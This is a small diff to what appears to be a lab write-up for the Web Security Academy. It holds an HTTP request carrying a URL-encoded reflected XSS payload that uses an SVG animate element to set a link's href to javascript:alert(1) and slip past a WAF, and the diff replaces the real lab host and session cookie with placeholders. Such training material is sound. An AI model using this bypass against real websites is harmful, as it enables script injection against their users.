@@ -28,8 +28,8 @@ If the WAF blocks all standard event handlers (`on...`) and `href` attributes, H
 Request:
 ```http
 GET /?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3D%22href%22+values%3Djavascript%3Aalert%281%29+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick+me%3C%2Ftext%3E%3C%2Fa%3E%3C%2Fsvg%3E HTTP/2
-Host: 0a2400db0336878381e5a79200e20090.web-security-academy.net
-Cookie: session=cqjVBrM2sefwwTOkJ8mBA6IF247aN0Ey
+Host: <host>.web-security-academy.net
+Cookie: session=sess
 Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
 Sec-Ch-Ua-Mobile: ?0
 Sec-Ch-Ua-Platform: "Linux"
